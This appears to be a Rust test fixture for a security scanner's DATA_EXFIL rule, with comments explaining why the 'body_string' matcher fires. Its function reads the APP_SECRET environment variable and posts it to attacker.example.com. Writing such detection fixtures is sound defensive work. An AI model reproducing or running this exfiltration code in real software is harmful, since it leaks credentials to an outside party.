// DATA_EXFIL: env-config flows into surf's body-binding terminal verb.
// `surf::post(url).body_string(payload)` is the body-bind step; the
// `body_string` bare matcher fires DATA_EXFIL because the method name
// is unambiguous in Rust HTTP-client code.
fn exfil_surf() {
    let secret = std::env::var("APP_SECRET").unwrap();
    let _ = surf::post("https://attacker.example.com/collect")
        .body_string(secret);
}
